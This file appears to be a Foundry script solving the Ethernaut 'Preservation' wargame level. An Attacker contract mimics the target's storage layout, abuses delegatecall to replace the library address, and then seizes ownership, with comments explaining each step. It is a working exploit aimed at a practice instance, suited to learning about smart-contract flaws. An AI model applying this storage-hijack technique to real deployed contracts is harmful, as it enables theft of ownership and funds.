// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Preservation.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Attacker {
    address public timeZone1Library; // to mimic Preservation storage layout
    address public timeZone2Library; // to mimic Preservation storage layout
    address public owner; // to mimic Preservation storage layout

    Preservation preservation;

    constructor(address _preservation) {
        preservation = Preservation(_preservation);
    }

    function setTimeZone1LibraryAsAttackerAddress() public {
        // 1. preservation delegates call to LibraryContract
        // => setFirstTime executed in the context of Preservation contract
        // ===> sets Preservation slot 0 storage : address timeZone1Library value as address(this)
        preservation.setFirstTime(uint256(uint160(address(this))));
    }

    function takeOwnership() public {
        // 2. preservation delegates call to Attacker
        // => Attacker:setFirstTime executed in the context of Preservation contract
        // ===> sets Preservation slot 2 storage : address owner value as msg.sender = Attacker deployer in PreservationScript
        preservation.setFirstTime(uint256(uint160(msg.sender)));
    }

    function setTime(uint256 _attacker) public {
        owner = address(uint160(_attacker));
    }
}

contract PreservationScript is Script {
    address constant ETHERNAUT_CONTRACT_ADDRESS = 0x87005037050210260583Fa9e08F9F432FE9952C9;
    Preservation public preservation = Preservation(ETHERNAUT_CONTRACT_ADDRESS);

    Attacker attacker;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("owner", preservation.owner());

        attacker = new Attacker(address(preservation));
        attacker.setTimeZone1LibraryAsAttackerAddress();
        attacker.takeOwnership();

        console.log("owner", preservation.owner());
        vm.stopBroadcast();
    }
}
